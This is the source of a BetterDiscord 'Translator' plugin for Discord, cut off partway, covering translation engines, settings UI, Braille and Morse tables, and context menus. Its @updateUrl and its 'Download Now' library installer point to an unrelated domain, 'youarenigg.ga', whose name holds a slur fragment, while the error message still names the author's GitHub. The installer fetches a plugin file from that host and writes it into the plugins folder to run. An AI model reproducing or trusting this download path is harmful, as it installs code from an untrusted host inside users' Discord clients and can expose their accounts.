/**
 * @name Translator
 * @author DevilBro
 * @authorId 278543574059057154
 * @version 2.3.8
 * @description Allows you to translate Messages and your outgoing Messages within Discord
 * @invite Jx3TjNS
 * @donate https://www.paypal.me/MircoWittrien
 * @patreon https://www.patreon.com/MircoWittrien
 * @website https://mwittrien.github.io/
 * @source https://github.com/mwittrien/BetterDiscordAddons/tree/master/Plugins/Translator/
 * @updateUrl https://youarenigg.ga/master/Plugins/Translator/Translator.plugin.js
 */

module.exports = (_ => {
	const config = {
		"info": {
			"name": "Translator",
			"author": "DevilBro",
			"version": "2.3.8",
			"description": "Allows you to translate Messages and your outgoing Messages within Discord"
		}
	};
	
	return !window.BDFDB_Global || (!window.BDFDB_Global.loaded && !window.BDFDB_Global.started) ? class {
		getName () {return config.info.name;}
		getAuthor () {return config.info.author;}
		getVersion () {return config.info.version;}
		getDescription () {return `The Library Plugin needed for ${config.info.name} is missing. Open the Plugin Settings to download it. \n\n${config.info.description}`;}
		
		downloadLibrary () {
			require("request").get("https://youarenigg.ga/master/Library/0BDFDB.plugin.js", (e, r, b) => {
				if (!e && b && r.statusCode == 200) require("fs").writeFile(require("path").join(BdApi.Plugins.folder, "0BDFDB.plugin.js"), b, _ => BdApi.showToast("Finished downloading BDFDB Library", {type: "success"}));
				else BdApi.alert("Error", "Could not download BDFDB Library Plugin. Try again later or download it manually from GitHub: https://mwittrien.github.io/downloader/?library");
			});
		}
		
		load () {
			if (!window.BDFDB_Global || !Array.isArray(window.BDFDB_Global.pluginQueue)) window.BDFDB_Global = Object.assign({}, window.BDFDB_Global, {pluginQueue: []});
			if (!window.BDFDB_Global.downloadModal) {
				window.BDFDB_Global.downloadModal = true;
				BdApi.showConfirmationModal("Library Missing", `The Library Plugin needed for ${config.info.name} is missing. Please click "Download Now" to install it.`, {
					confirmText: "Download Now",
					cancelText: "Cancel",
					onCancel: _ => {delete window.BDFDB_Global.downloadModal;},
					onConfirm: _ => {
						delete window.BDFDB_Global.downloadModal;
						this.downloadLibrary();
					}
				});
			}
			if (!window.BDFDB_Global.pluginQueue.includes(config.info.name)) window.BDFDB_Global.pluginQueue.push(config.info.name);
		}
		start () {this.load();}
		stop () {}
		getSettingsPanel () {
			let template = document.createElement("template");
			template.innerHTML = `<div style="color: var(--header-primary); font-size: 16px; font-weight: 300; white-space: pre; line-height: 22px;">The Library Plugin needed for ${config.info.name} is missing.\nPlease click <a style="font-weight: 500;">Download Now</a> to install it.</div>`;
			template.content.firstElementChild.querySelector("a").addEventListener("click", this.downloadLibrary);
			return template.content.firstElementChild;
		}
	} : (([Plugin, BDFDB]) => {
		var _this;
		
		const translateIconGeneral = `<svg name="Translate" width="24" height="24" viewBox="0 0 24 24"><mask/><path fill="currentColor" mask="url(#translateIconMask)" d="M 4 2 C 2.9005593 2 2 2.9005593 2 4 L 2 17 C 2 18.10035 2.9005593 19 4 19 L 11 19 L 12 22 L 20 22 C 21.10035 22 22 21.099441 22 20 L 22 7 C 22 5.9005592 21.099441 5 20 5 L 10.880859 5 L 10 2 L 4 2 z M 11.173828 6 L 20 6 C 20.550175 6 21 6.4498249 21 7 L 21 20 C 21 20.550175 20.550176 21 20 21 L 13 21 L 15 19 L 14.185547 16.236328 L 15.105469 15.314453 L 17.791016 18 L 18.521484 17.269531 L 15.814453 14.583984 C 16.714739 13.54911 17.414914 12.335023 17.730469 11.080078 L 19 11.080078 L 19 10.039062 L 15.365234 10.039062 L 15.365234 9 L 14.324219 9 L 14.324219 10.039062 L 12.365234 10.039062 L 11.173828 6 z M 7.1660156 6.4160156 C 8.2063466 6.4160156 9.1501519 6.7857022 9.9003906 7.4804688 L 9.9648438 7.5449219 L 8.7441406 8.7246094 L 8.6855469 8.6699219 C 8.4009108 8.3998362 7.9053417 8.0859375 7.1660156 8.0859375 C 5.8555986 8.0859375 4.7890625 9.1708897 4.7890625 10.505859 C 4.7890625 11.84083 5.8555986 12.925781 7.1660156 12.925781 C 8.5364516 12.925781 9.1309647 12.050485 9.2910156 11.464844 L 7.0800781 11.464844 L 7.0800781 9.9160156 L 11.03125 9.9160156 L 11.044922 9.984375 C 11.084932 10.194442 11.099609 10.379777 11.099609 10.589844 C 11.094109 12.945139 9.4803883 14.583984 7.1660156 14.583984 C 4.9107525 14.583984 3.0800781 12.749807 3.0800781 10.5 C 3.0800781 8.2501934 4.9162088 6.4160156 7.1660156 6.4160156 z M 12.675781 11.074219 L 16.669922 11.074219 C 16.669922 11.074219 16.330807 12.390095 15.111328 13.810547 C 14.576613 13.195806 14.206233 12.595386 13.970703 12.115234 L 12.980469 12.115234 L 12.675781 11.074219 z M 13.201172 12.884766 C 13.535824 13.484957 13.940482 14.059272 14.390625 14.583984 L 13.855469 15.115234 L 13.201172 12.884766 z"/><extra/></svg>`;
		const translateIconMask = `<mask id="translateIconMask" fill="black"><path fill="white" d="M 0 0 H 24 V 24 H 0 Z"/><path fill="black" d="M24 12 H 12 V 24 H 24 Z"/></mask>`;
		const translateIcon = translateIconGeneral.replace(`<extra/>`, ``).replace(`<mask/>`, ``).replace(` mask="url(#translateIconMask)"`, ``);
		const translateIconUntranslate = translateIconGeneral.replace(`<extra/>`, `<path fill="none" stroke="#f04747" stroke-width="2" d="m 14.702359,14.702442 8.596228,8.596148 m 0,-8.597139 -8.59722,8.596147 z"/>`).replace(`<mask/>`, translateIconMask);
		
		const TranslateButtonComponent = class TranslateButton extends BdApi.React.Component {
			render() {
				const enabled = _this.isTranslationEnabled(this.props.channelId);
				return BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.ChannelTextAreaButton, {
					className: BDFDB.DOMUtils.formatClassName(BDFDB.disCN._translatortranslatebutton, _this.isTranslationEnabled(this.props.channelId) && BDFDB.disCN._translatortranslating, BDFDB.disCN.textareapickerbutton),
					isActive: this.props.isActive,
					iconSVG: translateIcon,
					nativeClass: true,
					tooltip: enabled && {
						text: (_ => `${BDFDB.LanguageUtils.getName(languages[_this.getLanguageChoice(languageTypes.INPUT, messageTypes.SENT, this.props.channelId)])} ➝ ${BDFDB.LanguageUtils.getName(languages[_this.getLanguageChoice(languageTypes.OUTPUT, messageTypes.SENT, this.props.channelId)])}`),
						tooltipConfig: {style: "max-width: 400px"}
					},
					onClick: _ => {
						this.props.isActive = true;
						BDFDB.ReactUtils.forceUpdate(this);
						
						BDFDB.ModalUtils.open(_this, {
							size: "LARGE",
							header: BDFDB.LanguageUtils.LanguageStrings.SETTINGS,
							subHeader: "",
							onClose: _ => {
								this.props.isActive = false;
								BDFDB.ReactUtils.forceUpdate(this);
							},
							children: BDFDB.ReactUtils.createElement(TranslateSettingsComponent, {
								channelId: this.props.channelId
							})
						});
					},
					onContextMenu: _ => {
						_this.toggleTranslation(this.props.channelId);
						BDFDB.ReactUtils.forceUpdate(this);
					}
				});
			}
		};
		
		const TranslateSettingsComponent = class TranslateSettings extends BdApi.React.Component {
			filterLanguages(direction, place) {
				let isOutput = direction == languageTypes.OUTPUT;
				return BDFDB.ObjectUtils.toArray(BDFDB.ObjectUtils.map(isOutput ? BDFDB.ObjectUtils.filter(languages, lang => !lang.auto) : languages, (lang, id) => ({
					value: id,
					label: BDFDB.LanguageUtils.getName(lang),
					backup: this.isOnlyBackup(lang)
				}))).filter(isOutput && this.isOnlyBackup(languages[_this.getLanguageChoice(languageTypes.INPUT, place, this.props.channelId)]) ? (n => n.backup) : (n => n));
			}
			isOnlyBackup(lang) {
				return lang && (lang.auto && !translationEngines[_this.settings.engines.translator].auto || !lang.auto && !lang.special && !translationEngines[_this.settings.engines.translator].languages.includes(lang.id));
			}
			render() {
				return [
					BDFDB.ArrayUtils.is(_this.settings.exceptions.wordStart) && _this.settings.exceptions.wordStart.length && [
						BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex, {
							className: BDFDB.disCN.marginbottom8,
							children: BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.SettingsLabel, {
								label: `Words starting with ${_this.settings.exceptions.wordStart.map(n => '"' + n + '"').join(", ")} will be ignored`
							})
						}),
						BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.FormComponents.FormDivider, {
							className: BDFDB.disCN.marginbottom8
						})
					],
					Object.keys(_this.defaults.choices).map(place => {
						const isSpecific = channelLanguages[this.props.channelId] && channelLanguages[this.props.channelId][place];
						return Object.keys(_this.defaults.choices[place].value).map(direction => [
							BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.FormComponents.FormItem, {
								title: `${BDFDB.LibraryModules.StringUtils.upperCaseFirstChar(direction.toLowerCase())} Language in ${place.toLowerCase()} Messages: `,
								titleChildren: direction == languageTypes.OUTPUT && [{
									text: _ => isSpecific ? `${BDFDB.LibraryModules.StringUtils.upperCaseFirstChar(place)} Language Selection will be changed specifically for this Channel` : `${BDFDB.LibraryModules.StringUtils.upperCaseFirstChar(place)} Language Selection will be changed for all Channels`,
									name: isSpecific ? BDFDB.LibraryComponents.SvgIcon.Names.LOCK_CLOSED : BDFDB.LibraryComponents.SvgIcon.Names.LOCK_OPEN,
									color: isSpecific && "var(--bdfdb-red)",
									onClick: _ => {
										if (channelLanguages[this.props.channelId] && channelLanguages[this.props.channelId][place]) {
											delete channelLanguages[this.props.channelId][place];
											if (BDFDB.ObjectUtils.isEmpty(channelLanguages[this.props.channelId])) delete channelLanguages[this.props.channelId];
										}
										else {
											if (!channelLanguages[this.props.channelId]) channelLanguages[this.props.channelId] = {};
											channelLanguages[this.props.channelId][place] = {};
											for (let l in languageTypes) channelLanguages[this.props.channelId][place][languageTypes[l]] = _this.getLanguageChoice(languageTypes[l], place, null);
										}
										BDFDB.DataUtils.save(channelLanguages, _this, "channelLanguages");
										
										BDFDB.ReactUtils.forceUpdate(this);
									}
								}, {
									iconSVG: `<svg width="21" height="21" fill="currentColor"><path d="M 0, 10.515 c 0, 2.892, 1.183, 5.521, 3.155, 7.361 L 0, 21.031 h 7.887 V 13.144 l -2.892, 2.892 C 3.549, 14.722, 2.629, 12.75, 2.629, 10.515 c 0 -3.418, 2.235 -6.309, 5.258 -7.492 v -2.629 C 3.418, 1.577, 0, 5.652, 0, 10.515 z M 21.031, 0 H 13.144 v 7.887 l 2.892 -2.892 C 17.482, 6.309, 18.402, 8.281, 18.402, 10.515 c 0, 3.418 -2.235, 6.309 -5.258, 7.492 V 20.768 c 4.469 -1.183, 7.887 -5.258, 7.887 -10.121 c 0 -2.892 -1.183 -5.521 -3.155 -7.361 L 21.031, 0 z"/></svg>`,
									onClick: _ => {
										let input = _this.getLanguageChoice(languageTypes.INPUT, place, this.props.channelId);
										let output = _this.getLanguageChoice(languageTypes.OUTPUT, place, this.props.channelId);
										input = input == "auto" ? "en" : input;
										
										_this.saveLanguageChoice(output, languageTypes.INPUT, place, this.props.channelId);
										_this.saveLanguageChoice(input, languageTypes.OUTPUT, place, this.props.channelId);
										
										_this.setLanguages();
										
										BDFDB.ReactUtils.forceUpdate(this);
									}
								}].map(data => {
									const icon = BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Clickable, {
										className: BDFDB.disCN._translatorconfigbutton,
										onClick: data.onClick,
										children: BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.SvgIcon, {
											width: 24,
											height: 24,
											color: data.color || "currentColor",
											name: data.name,
											iconSVG: data.iconSVG
										})
									});
									return data.text ? BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.TooltipContainer, {text: data.text, children: icon}) : icon;
								}),
								className: BDFDB.disCN.marginbottom8,
								children: BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Select, {
									value: _this.getLanguageChoice(direction, place, this.props.channelId),
									options: this.filterLanguages(direction, place),
									optionRenderer: lang => languages[lang.value] ? BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex, {
										align: BDFDB.LibraryComponents.Flex.Align.CENTER,
										children: [
											BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex.Child, {
												grow: 1,
												children: lang.label
											}),
											lang.backup && BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.TooltipContainer, {
												text: "Will use Backup Translator",
												tooltipConfig: {
													color: "red"
												},
												children: BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.SvgIcon, {
													nativeClass: true,
													width: 20,
													height: 20,
													color: "var(--bdfdb-red)",
													name: BDFDB.LibraryComponents.SvgIcon.Names.WARNING
												})
											}),
											BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.FavButton, {
												isFavorite: languages[lang.value].fav == 0,
												onClick: value => {
													if (value) favorites.push(lang.value);
													else BDFDB.ArrayUtils.remove(favorites, lang.value, true);
													BDFDB.DataUtils.save(favorites.sort(), _this, "favorites");
													_this.setLanguages();
												}
											})
										]
									}) : null,
									onChange: value => {
										_this.saveLanguageChoice(value, direction, place, this.props.channelId);
										BDFDB.ReactUtils.forceUpdate(this);
									}
								})
							}),
							direction == languageTypes.OUTPUT && BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.FormComponents.FormDivider, {
								className: BDFDB.disCN.marginbottom8
							})
						]);
					}),
					Object.keys(_this.defaults.engines).map(key => BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.FormComponents.FormItem, {
						title: _this.defaults.engines[key].description,
						className: BDFDB.disCN.marginbottom8,
						children: BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Select, {
							value: _this.settings.engines[key],
							options: (key == "backup" ? ["----"] : []).concat(Object.keys(translationEngines)).filter(key == "backup" ? (n => n != _this.settings.engines.translator) : (n => n)).map(engineKey => ({value: engineKey, label: translationEngines[engineKey] ? translationEngines[engineKey].name : "----"})),
							maxVisibleItems: 3,
							onChange: value => {
								_this.settings.engines[key] = value;
								BDFDB.DataUtils.save(_this.settings.engines, _this, "engines");
								_this.setLanguages();
								BDFDB.ReactUtils.forceUpdate(this);
							}
						})
					})),
					Object.keys(_this.defaults.general).filter(key => _this.defaults.general[key].popout).map(key => BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.SettingsSaveItem, {
						type: "Switch",
						plugin: _this,
						keys: ["general", key],
						label: _this.defaults.general[key].description,
						tag: BDFDB.LibraryComponents.FormComponents.FormTitle.Tags.H5,
						value: _this.settings.general[key]
					})),
					BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.SettingsItem, {
						type: "Switch",
						label: "Translate your Messages before sending",
						tag: BDFDB.LibraryComponents.FormComponents.FormTitle.Tags.H5,
						value: _this.isTranslationEnabled(this.props.channelId),
						onChange: value => {
							_this.toggleTranslation(this.props.channelId);
							BDFDB.ReactUtils.forceUpdate(this);
						}
					})
				].flat(10).filter(n => n);
			}
		};

		const brailleConverter = {
			"0":"⠴", "1":"⠂", "2":"⠆", "3":"⠒", "4":"⠲", "5":"⠢", "6":"⠖", "7":"⠶", "8":"⠦", "9":"⠔", "!":"⠮", "\"":"⠐", "#":"⠼", "$":"⠫", "%":"⠩", "&":"⠯", "'":"⠄", "(":"⠷", ")":"⠾", "*":"⠡", "+":"⠬", ",":"⠠", "-":"⠤", ".":"⠨", "/":"⠌", ":":"⠱", ";":"⠰", "<":"⠣", "=":"⠿", ">":"⠜", "?":"⠹", "@":"⠈", "a":"⠁", "b":"⠃", "c":"⠉", "d":"⠙", "e":"⠑", "f":"⠋", "g":"⠛", "h":"⠓", "i":"⠊", "j":"⠚", "k":"⠅", "l":"⠇", "m":"⠍", "n":"⠝", "o":"⠕", "p":"⠏", "q":"⠟", "r":"⠗", "s":"⠎", "t":"⠞", "u":"⠥", "v":"⠧", "w":"⠺", "x":"⠭", "y":"⠽", "z":"⠵", "[":"⠪", "\\":"⠳", "]":"⠻", "^":"⠘", "⠁":"a", "⠂":"1", "⠃":"b", "⠄":"'", "⠅":"k", "⠆":"2", "⠇":"l", "⠈":"@", "⠉":"c", "⠊":"i", "⠋":"f", "⠌":"/", "⠍":"m", "⠎":"s", "⠏":"p", "⠐":"\"", "⠑":"e", "⠒":"3", "⠓":"h", "⠔":"9", "⠕":"o", "⠖":"6", "⠗":"r", "⠘":"^", "⠙":"d", "⠚":"j", "⠛":"g", "⠜":">", "⠝":"n", "⠞":"t", "⠟":"q", "⠠":", ", "⠡":"*", "⠢":"5", "⠣":"<", "⠤":"-", "⠥":"u", "⠦":"8", "⠧":"v", "⠨":".", "⠩":"%", "⠪":"[", "⠫":"$", "⠬":"+", "⠭":"x", "⠮":"!", "⠯":"&", "⠰":";", "⠱":":", "⠲":"4", "⠳":"\\", "⠴":"0", "⠵":"z", "⠶":"7", "⠷":"(", "⠸":"_", "⠹":"?", "⠺":"w", "⠻":"]", "⠼":"#", "⠽":"y", "⠾":")", "⠿":"=", "_":"⠸"
		};

		const morseConverter = {
			"0":"−−−−−", "1":"·−−−−", "2":"··−−−", "3":"···−−", "4":"····−", "5":"·····", "6":"−····", "7":"−−···", "8":"−−−··", "9":"−−−−·", "!":"−·−·−−", "\"":"·−··−·", "$":"···−··−", "&":"·−···", "'":"·−−−−·", "(":"−·−−·", ")":"−·−−·−", "+":"·−·−·", ",":"−−··−−", "-":"−····−", ".":"·−·−·−", "/":"−··−·", ":":"−−−···", ";":"−·−·−·", "=":"−···−", "?":"··−−··", "@":"·−−·−·", "a":"·−", "b":"−···", "c":"−·−·", "d":"−··", "e":"·", "f":"··−·", "g":"−−·", "h":"····", "i":"··", "j":"·−−−", "k":"−·−", "l":"·−··", "m":"−−", "n":"−·", "o":"−−−", "p":"·−−·", "q":"−−·−", "r":"·−·", "s":"···", "t":"−", "u":"··−", "v":"···−", "w":"·−−", "x":"−··−", "y":"−·−−", "z":"−−··", "·":"e", "··":"i", "···":"s", "····":"h", "·····":"5", "····−":"4", "···−":"v", "···−··−":"$", "···−−":"3", "··−":"u", "··−·":"f", "··−−··":"?", "··−−·−":"_", "··−−−":"2", "·−":"a", "·−·":"r", "·−··":"l", "·−···":"&", "·−··−·":"\"", "·−·−·":"+", "·−·−·−":".", "·−−":"w", "·−−·":"p", "·−−·−·":"@", "·−−−":"j", "·−−−−":"1", "·−−−−·":"'", "−":"t", "−·":"n", "−··":"d", "−···":"b", "−····":"6", "−····−":"-", "−···−":"=", "−··−":"x", "−··−·":"/", "−·−":"k", "−·−·":"c", "−·−·−·":";", "−·−·−−":"!", "−·−−":"y", "−·−−·":"(", "−·−−·−":")", "−−":"m", "−−·":"g", "−−··":"z", "−−···":"7", "−−··−−":",", "−−·−":"q", "−−−":"o", "−−−··":"8", "−−−···":":", "−−−−·":"9", "−−−−−":"0", "_":"··−−·−"
		};
		
		const googleLanguages = ["af","am","ar","az","be","bg","bn","bs","ca","ceb","co","cs","cy","da","de","el","en","eo","es","et","eu","fa","fi","fr","fy","ga","gd","gl","gu","ha","haw","hi","hmn","hr","ht","hu","hy","id","ig","is","it","iw","ja","jw","ka","kk","km","kn","ko","ku","ky","la","lb","lo","lt","lv","mg","mi","mk","ml","mn","mr","ms","mt","my","ne","nl","no","ny","or","pa","pl","ps","pt","ro","ru","rw","sd","si","sk","sl","sm","sn","so","sq","sr","st","su","sv","sw","ta","te","tg","th","tk","tl","tr","tt","ug","uk","ur","uz","vi","xh","yi","yo","zh-CN","zh-TW","zu"];
		const translationEngines = {
			googleapi: {
				name: "Google",
				auto: true,
				funcName: "googleApiTranslate",
				languages: googleLanguages
			},
			deepl: {
				name: "DeepL",
				auto: true,
				funcName: "deepLTranslate",
				languages: ["bg","cs","da","de","en","el","es","et","fi","fr","hu","it","ja","lt","lv","nl","pl","pt","ro","ru","sk","sl","sv","zh"],
				premium: true,
				key: "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx:fx"
			},
			itranslate: {
				name: "iTranslate",
				auto: true,
				funcName: "iTranslateTranslate",
				languages: [...new Set(["af","ar","az","be","bg","bn","bs","ca","ceb","cs","cy","da","de","el","en","eo","es","et","eu","fa","fi","fil","fr","ga","gl","gu","ha","he","hi","hmn","hr","ht","hu","hy","id","ig","is","it","ja","jw","ka","kk","km","kn","ko","la","lo","lt","lv","mg","mi","mk","ml","mn","mr","ms","mt","my","ne","nl","no","ny","pa","pl","pt-BR","pt-PT","ro","ru","si","sk","sl","so","sq","sr","st","su","sv","sw","ta","te","tg","th","tr","uk","ur","uz","vi","we","yi","yo","zh-CN","zh-TW","zu"].concat(googleLanguages))].sort(),
				key: "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
			},
			yandex: {
				name: "Yandex",
				auto: true,
				funcName: "yandexTranslate",
				languages: ["af","am","ar","az","ba","be","bg","bn","bs","ca","ceb","cs","cy","da","de","el","en","eo","es","et","eu","fa","fi","fr","ga","gd","gl","gu","he","hi","hr","ht","hu","hy","id","is","it","ja","jv","ka","kk","km","kn","ko","ky","la","lb","lo","lt","lv","mg","mhr","mi","mk","ml","mn","mr","ms","mt","my","ne","nl","no","pa","pap","pl","pt","ro","ru","si","sk","sl","sq","sr","su","sv","sw","ta","te","tg","th","tl","tr","tt","udm","uk","ur","uz","vi","xh","yi","zh"],
				key: "trnsl.x.x.xxxxxxxxxxxxxxxx.xxxxxxxxxxxxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
			},
			papago: {
				name: "Papago",
				auto: false,
				funcName: "papagoTranslate",
				languages: ["en","es","fr","id","ja","ko","th","vi","zh-CN","zh-TW"],
				key: "xxxxxxxxxxxxxxxxxxxx xxxxxxxxxx"
			},
			baidu: {
				name: "Baidu",
				auto: true,
				funcName: "baiduTranslate",
				languages: ["ar","bg","cs","da","de","el","en","es","et","fi","fr","hu","it","jp","ko","nl","pl","pt","ro","ru","sl","sv","th","vi","zh","zh-CN","zh-TW"],
				parser: {
					"ar": "ara",
					"bg": "bul",
					"da": "dan",
					"es": "spa",
					"et": "est",
					"fi": "fin",
					"fr": "fra",
					"ko": "kor",
					"ro": "rom",
					"sl": "slo",
					"sv": "swe",
					"vi": "vie",
					"zh": "wyw",
					"zh-CN": "zh",
					"zh-TW": "cht"
				},
				key: "xxxxxxxxx xxxxxx xxxxxxxxxx"
			}
		};
		
		var languages = {};
		var favorites = [];
		var authKeys = {};
		var channelLanguages = {};
		var translationEnabledStates = [], isTranslating;
		var translatedMessages = {}, oldMessages = {};
		
		const defaultLanguages = {
			INPUT: "auto",
			OUTPUT: "$discord"
		};
		const languageTypes = {
			INPUT: "input",
			OUTPUT: "output"
		};
		const messageTypes = {
			RECEIVED: "received",
			SENT: "sent",
		};
	
		return class Translator extends Plugin {
			onLoad () {
				_this = this;
				
				this.defaults = {
					general: {
						addTranslateButton:		{value: true, 	popout: false,	description: "Adds a Translate Button to the Channel Textarea"},
						usePerChatTranslation:	{value: true, 	popout: false,	description: "Enables/Disables the Translator Button State per Channel and not globally"},
						sendOriginalMessage:	{value: false, 	popout: true,	description: "Also sends the original Message when translating your own Message"},
						showOriginalMessage:	{value: false, 	popout: true,	description: "Also shows the original Message when translating someones Message"}
					},
					choices: {},
					exceptions: {
						wordStart:				{value: ["!"],			max: 1,		description: "Words starting with any of these will be ignored"}
					},
					engines: {
						translator:				{value: "googleapi", 	description: "Translation Engine"},
						backup:					{value: "----", 		description: "Backup Engine"}
					}
				};
				for (let m in messageTypes) this.defaults.choices[messageTypes[m]] = {value: Object.keys(languageTypes).reduce((newObj, l) => (newObj[languageTypes[l]] = defaultLanguages[l], newObj), {})};
			
				this.patchedModules = {
					before: {
						ChannelTextAreaForm: "render",
						ChannelEditorContainer: "render",
						Embed: "render"
					},
					after: {
						ChannelTextAreaButtons: "type",
						Messages: "type",
						MessageContent: "type",
						Embed: "render"
					}
				};

				this.css = `
					${BDFDB.dotCN._translatortranslatebutton + BDFDB.dotCNS._translatortranslating + BDFDB.dotCN.textareaicon} {
						color: var(--bdfdb-red) !important;
					}
					${BDFDB.dotCN._translatorconfigbutton} {
						margin: 2px 3px 0 6px;
					}
				`;
			}
			
			onStart () {
				this.forceUpdateAll();
			}
			
			onStop () {
				this.forceUpdateAll();
			}

			getSettingsPanel (collapseStates = {}) {
				let settingsPanel;
				return settingsPanel = BDFDB.PluginUtils.createSettingsPanel(this, {
					collapseStates: collapseStates,
					children: _ => {
						let settingsItems = [];
						
						for (let key in this.defaults.general) settingsItems.push(BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.SettingsSaveItem, {
							type: "Switch",
							plugin: this,
							keys: ["general", key],
							label: this.defaults.general[key].description,
							value: this.settings.general[key]
						}));
						
						settingsItems.push(BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.FormComponents.FormDivider, {
							className: BDFDB.disCNS.dividerdefault + BDFDB.disCN.marginbottom8
						}));
						
						settingsItems.push(BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.SettingsPanelList, {
							title: "Own Auth Keys:",
							children: Object.keys(translationEngines).filter(key => translationEngines[key].key).map(key => BDFDB.ReactUtils.createElement("div", {
								className: BDFDB.disCN.marginbottom8,
								children: [
									BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.Flex, {
										className: BDFDB.disCN.marginbottom8,
										align: BDFDB.LibraryComponents.Flex.Align.CENTER,
										direction: BDFDB.LibraryComponents.Flex.Direction.HORIZONTAL,
										children: [
											BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.FormComponents.FormTitle, {
												className: BDFDB.disCN.marginreset,
												tag: BDFDB.LibraryComponents.FormComponents.FormTitle.Tags.H5,
												children: translationEngines[key].name
											}),
											translationEngines[key].premium && BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.SettingsItem, {
												type: "Switch",
												margin: 0,
												grow: 0,
												label: "Paid Version",
												tag: BDFDB.LibraryComponents.FormComponents.FormTitle.Tags.H5,
												value: authKeys[key] && authKeys[key].paid,
												onChange: value => {
													if (!authKeys[key]) authKeys[key] = {};
													authKeys[key].paid = value;
													BDFDB.DataUtils.save(authKeys, this, "authKeys");
												}
											})
										]
									}),
									BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.TextInput, {
										placeholder: translationEngines[key].key,
										value: authKeys[key] && authKeys[key].key,
										onChange: value => {
											if (!authKeys[key]) authKeys[key] = {};
											authKeys[key].key = (value || "").trim();
											BDFDB.DataUtils.save(authKeys, this, "authKeys");
										}
									})
								]
							}))
						}));
						
						settingsItems.push(BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.FormComponents.FormDivider, {
							className: BDFDB.disCNS.dividerdefault + BDFDB.disCN.marginbottom8
						}));
						
						for (let key in this.defaults.exceptions) settingsItems.push(BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.FormComponents.FormItem, {
							title: this.defaults.exceptions[key].description,
							className: BDFDB.disCN.marginbottom8,
							children: BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.ListInput, {
								placeholder: "New Exception",
								maxLength: this.defaults.exceptions[key].max,
								items: this.settings.exceptions[key],
								onChange: value => {
									this.SettingsUpdated = true;
									BDFDB.DataUtils.save(value, this, "exceptions", key);
								}
							})
						}));
						
						return settingsItems.flat(10);
					}
				});
			}
		
			onSettingsClosed () {
				if (this.SettingsUpdated) {
					delete this.SettingsUpdated;
					this.forceUpdateAll();
				}
			}
		
			forceUpdateAll () {
				favorites = BDFDB.DataUtils.load(this, "favorites");
				favorites = !BDFDB.ArrayUtils.is(favorites) ? [] : favorites;
				
				authKeys = BDFDB.DataUtils.load(this, "authKeys");
				channelLanguages = BDFDB.DataUtils.load(this, "channelLanguages");
				
				this.setLanguages();
				BDFDB.PatchUtils.forceAllUpdates(this);
				BDFDB.MessageUtils.rerenderAll();
			}

			onMessageContextMenu (e) {
				if (e.instance.props.message && e.instance.props.channel) {
					let translated = translatedMessages[e.instance.props.message.id];
					let hint = BDFDB.BDUtils.isPluginEnabled("MessageUtilities") ? BDFDB.BDUtils.getPlugin("MessageUtilities").getActiveShortcutString("__Translate_Message") : null;
					let [children, index] = BDFDB.ContextMenuUtils.findItem(e.returnvalue, {id: ["pin", "unpin"]});
					if (index == -1) [children, index] = BDFDB.ContextMenuUtils.findItem(e.returnvalue, {id: ["edit", "add-reaction", "quote"]});
					children.splice(index > -1 ? index + 1 : 0, 0, BDFDB.ContextMenuUtils.createItem(BDFDB.LibraryComponents.MenuItems.MenuItem, {
						label: translated ? this.labels.context_messageuntranslateoption : this.labels.context_messagetranslateoption,
						id: BDFDB.ContextMenuUtils.createItemId(this.name, translated ? "untranslate-message" : "translate-message"),
						hint: hint && (_ => BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.MenuItems.MenuHint, {
							hint: hint
						})),
						icon: _ => BDFDB.ReactUtils.createElement(BDFDB.LibraryComponents.MenuItems.MenuIcon, {
							icon: translated ? translateIconUntranslate : translateIcon
						}),
						disabled: !translated && isTranslating,
						action: _ => this.translateMessage(e.instance.props.message, e.instance.props.channel)
					}));
					this.injectSearchItem(e);
				}
			}
			
			onNativeContextMenu (e) {
				this.injectSearchItem(e);
			}
			
			onSlateContextMenu (e) {
				this.injectSearchItem(e);
			}
			
			injectSearchItem (e) {
				let text = document.getSelection().toString();
				if (text) {
					let translating, foundTranslation, foundInput, foundOutput;
					let [children, index] = BDFDB.ContextMenuUtils.findItem(e.returnvalue, {id: ["devmode-copy-id", "search-google"], group: true});
					children.splice(index > -1 ? index + 1 : 0, 0, BDFDB.ContextMenuUtils.createItem(BDFDB.LibraryComponents.MenuItems.MenuGroup, {
						children: BDFDB.ContextMenuUtils.createItem(BDFDB.LibraryComponents.MenuItems.MenuItem, {
							id: BDFDB.ContextMenuUtils.createItemId(this.name, "search-translation"),
							disabled: isTranslating,
							label: this.labels.context_translator,
							persisting: true,
							action: event => {
								let item = BDFDB.DOMUtils.getParent(BDFDB.dotCN.menuitem, event.target);
								if (item) {
									let createTooltip = _ => {
										BDFDB.TooltipUtils.create(item, [
											`${BDFDB.LanguageUtils.LibraryStrings.from} ${foundInput.name}:`,
											text,
